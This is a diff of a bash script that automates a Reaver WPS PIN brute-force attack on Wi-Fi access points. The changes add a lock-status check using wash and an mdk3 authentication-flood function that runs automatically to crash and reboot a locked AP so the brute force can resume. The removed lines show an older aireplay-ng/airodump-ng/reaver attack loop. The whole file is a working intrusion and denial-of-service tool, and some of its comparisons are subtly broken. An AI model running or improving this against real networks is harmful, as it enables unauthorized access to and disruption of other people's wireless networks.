@@ -343,174 +343,88 @@ reaverConfig(){
 checkAPStatus(){
 	local CMD_LOCK_STATUS;
 	local WASH_OUTPUT;
+	local CHECK_LOCK_STATUS;
 
 	CMD_LOCK_STATUS="timeout --preserve-status $CHECK_APLOCK_TIMEOUT wash -i $WIFI_CARD_MONITOR";
+	CHECK_LOCK_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.LockStatus';
+
 	echoBlue "Checking AP Lock Status (Timeout For Result In $CHECK_APLOCK_TIMEOUT Sec)......";
 
 	if [[ ! -f $STATUS_FILE ]]; then
 		touch $STATUS_FILE;
-		ehoGreen "Status File for $AP_BSSID Created......";
+		echoGreen "Status File for $AP_BSSID Created......";
 	else
-		choBlue "Status File for $AP_BSSID Found......";
+		echoBlue "Status File for $AP_BSSID Found......";
 	fi
+
+	touch $CHECK_LOCK_STATUS;
 
 	eval $CMD_LOCK_STATUS | {
 		while read -r WASH_OUTPUT; do
 			if [[ $(echo "$WASH_OUTPUT" | grep -ic "$AP_BSSID") != 0 ]]; then
 				if [[ $(awk '{ print $5 }' <<< $WASH_OUTPUT) -eq "Yes" ]]; then
-					echo $(date +"%d/%m/%Y %H:%M:%S AP_CHECK_STATUS_LOCKED") >> $STATUS_FILE;
-					echoRed "AP Is Locked......";
+					echo "AP_CHECK_STATUS_LOCKED" > $CHECK_LOCK_STATUS;
+					break;
 				else
-					echo $(date +"%d/%m/%Y %H:%M:%S AP_CHECK_STATUS_UNLOCKED") >> $STATUS_FILE;
-					echoGreen "AP Is UnLocked......";
+					echo "AP_CHECK_STATUS_UNLOCKED" > $CHECK_LOCK_STATUS;
+					break
 				fi
 			else
-				if [[ $AP_DETECTED == 0 ]]; then
-					echo $(date +"%d/%m/%Y %H:%M:%S AP_NOT_FOUND") >> $STATUS_FILE;
-					echoRed "AP Not Found......";
-				fi
+				echo "AP_NOT_FOUND" > $CHECK_LOCK_STATUS;
 			fi
 		done
 
-		$(killall -I wash);
+		echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_LOCK_STATUS)") >> $STATUS_FILE
 	}
+
+	case $(echo $CHECK_LOCK_STATUS) in
+		["AP_CHECK_STATUS_LOCKED"]* )
+			AP_LOCK="Yes";;
+		["AP_CHECK_STATUS_UNLOCKED"]* )
+			AP_LOCK="No";;
+	esac
+
+	$(rm $CHECK_LOCK_STATUS);
 }
 
 unlockAP(){
-	while true; do
-		rm attack 2> null
-		rm ap_status 2> null
-		rm ap_channel 2> null
-		rm assoc 2> null
+	local MDK3PID;
+	local CMD_MDK3;
+	local MDK3_OUTPUT;
+	local CLIENT_COUNT;
+	local MDK3_STATUS;
 
-		#AP_ESSID="TARGET_ESSID"
-		#AP_BSSID="TARGET_BSSID"
-		#MY_MAC="YOU_MAC"
-		#MON_INTERFACE=wlan0mon
-		#PREV_SESS_FILE="PREV_SESSION_FILE.wpc"
-		countTryPin=0
-		countFile=totalTryPinCount # count file to store total try pin
-		waitTryReboot=0 # count wait time AP rebooting (DDOS MDK3)
-		waitReboot=0 # count wait time AP recovery after rebooting
+	if [[ ! -f $STATUS_FILE ]]; then
+		touch $STATUS_FILE;
+		echoGreen "Status File for $AP_BSSID Created......";
+	else
+		echoBlue "Status File for $AP_BSSID Found......";
+	fi
 
-		touch $countFile
-		echo -e -n "\n\nDetect channel"
-		touch assoc
+	MDK3_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.MDK3'
+	touch $MDK3_STATUS;
 
-		((reaver -i $WIFI_CARD_MONITOR -e $AP_ESSID -b $AP_BSSID -A -s $SESSION_FILE) 2>&1) > assoc & assoc_pid=$!
+	CMD_MDK3="mdk3 $WIFI_CARD_MONITOR  a -a $AP_BSSID -m";
 
-		while [ -z "$(grep Associated assoc)" ]; do
-			sleep 3
-			echo -n .
+	eval $CMD_MDK3 | {
+		MDK3PID=$(ps | grep -i 'mdk3' | awk '{ print $1 }');
+
+		while read -r MDK3_OUTPUT; do
+			if [[ $(echo "$MDK3_OUTPUT" | grep -ic "Device is still responding with") != 0 ]]; then
+				CLIENT_COUNT=$(echo "$MDK3_OUTPUT" | awk '{ print $6 }');
+				echo $CLIENT_COUNT > $MDK3_STATUS;
+
+				echo -ne "\r Device is still responding with $(tail -n 1 $MDK3_STATUS)";
+			fi
 		done
 
-		echo -e "\n\n"
-		kill -9 $assoc_pid
-		wait $assoc_pid 2> null
-		rm assoc
-		echo -n "Wait association"
+		echo $(date +"%d/%m/%Y %H:%M:%S MDK3_FLOOD_ATTACK") >> $STATUS_FILE
 
-		((aireplay-ng -1 0 -e $AP_ESSID -a $AP_BSSID -h $WIFI_CARD_RNDMAC $WIFI_CARD_MONITOR) 2>&1) > ap_channel & ap_channel_pid=$!
-###### Review up to here ######
+		$(kill "$MDK3PID");
+		$(rm $MDK3_STATUS);
+	}
 
-		while [ -z "$(grep successful ap_channel)" ]; do
-			sleep 1
-			echo -n "."
-		done
-
-		channel="$(head -1 ap_channel | tail -c 3 | head -c 2)"
-		echo -e "\n\Channel set to $channel\n\n"
-		rm ap_channel
-
-		touch ap_status
-		echo -n -e "\nCheck AP WPS lock"
-
-		while [ -z "$(grep $AP_SSID ap_status)" ]; do
-			((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID -c $channel) 2>&1) > ap_status & airodump_pid=$!
-			echo -n .
-			sleep 1
-			kill -9 $airodump_pid
-			wait $airodump_pid 2> null
-		done
-
-		echo -e "\n\n"
-
-		((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID -c $channel) 2>&1) > ap_status & airodump_pid=$!
-
-		while [ -z "$(grep $AP_SSID ap_status -m 1)" ]; do
-			sleep 2
-		done
-
-		kill -9 $airodump_pid
-		wait $airodump_pid 2> null
-
-		while [ -z "$(grep Locked ap_status -m 1)" ]; do
-			((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID -c $channel) 2>&1) > ap_status & airodump_pid=$!
-
-			echo -e "\n\nBegig reaver attack\n\n"
-			echo -n "Wait association"
-
-			((aireplay-ng -1 0 -e $AP_SSID -a $AP_BSSID -h $MY_MAC $MON_INTERFACE) 2>&1) > ap_c > ap_channel_pid=$!
-
-			while [ -z "$(grep successful ap_channel)" ]; do
-				sleep 1
-				echo -n "."
-			done
-
-			echo -e "\n\n"
-
-#			timeout 10 reaver -i $MON_INTERFACE -e $AP_SSID -b $AP_BSSID --no-nacks -vv -s $PREV_SE>
-			countTryPin=$[countTryPin + 1]
-			kill -9 $airodump_pid
-			wait $airodump_pid 2> null
-		done
-
-		# Force a reboot in the AP to unlock WPS
-		((mdk3 $MON_INTERFACE a -a $AP_BSSID) 2>&1) > attack & mdk3_pid=$!
-
-		echo -e "\n\n"
-
-		while [ -n "$(grep Locked ap_status -m 1)" ] && [ -n "$(grep $AP_SSID ap_status -m 1)" ]; do
-			((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID -c $channel) 2>&1) > ap_status &
-			airodump_pid=$!
-			sleep 4
-			waitTryReboot=$[waitTryReboot + 4]
-			echo -e -n "\rTry calling reboot AP. Wait $waitTryReboot sec."
-			kill -9 $airodump_pid
-			wait $airodump_pid 2> null
-		done
-
-		# The AP is now rebooted. Kill the mdk3 process and wait 2 mins to restart reaver attack
-		kill -9 $mdk3_pid
-		wait $mdk3_pid 2> null
-		totalTryPin=`cat $countFile`
-		totalTryPin=$(($totalTryPin + $countTryPin))
-		echo $totalTryPin > $countFile
-		echo -e "\n\n"
-
-		while [ -z "$(grep $AP_SSID ap_status)" ]; do
-			# After reboot AP may be change channel. Run without channel
-			((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID) 2>&1) > ap_status & airodump_pid=$!
-			sleep 5
-			waitReboot=$[waitReboot + 5]
-			echo -e -n "\rAP rebooting. Wait $waitReboot sec."
-			kill -9 $airodump_pid
-			wait $airodump_pid 2> null
-		done
-
-		rm attack
-		rm ap_status
-		rm null
-
-		execTime=$(($SECONDS+$waitTryReboot+$waitReboot))
-		echo -e "\n\nDone $countTryPin try pin.\
-			\nCalling reboot AP wait time $waitTryReboot sec.\
-			\nAP rebooting wait time $waitReboot sec.\
-			\nTotal execute time $SECONDS sec.\
-			\nTotal try pin $totalTryPin\n\n"
-		sleep 3
-		SECONDS=0
-	done
+	checkAPStatus;
 }
 
 getRandomMac(){
@@ -857,8 +771,16 @@ while true; do
 	if [[ $(grep -icw 'ap_rate_limiting' $STATUS_FILE) != 0 ]]; then
 		if [[ "$AP_LOCK" == "Yes" ]]; then
 			echoRed "AP Locked......";
-			break;
-			### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP  ###
+			echoOrange "Trying To Unlock AP......";
+
+			unlockAP;
+
+			if [[ "$AP_LOCK" -eq "Yes" ]]; then
+				echoRed "Unlock AP Unsuccessful......";
+				echoBlue "Try To Increase Max Clients Value In configurationSettings......";
+				echoBlue "And Try To Run Script Again......";
+				break;
+			fi
 		else
 			### checkLockStatus;
 
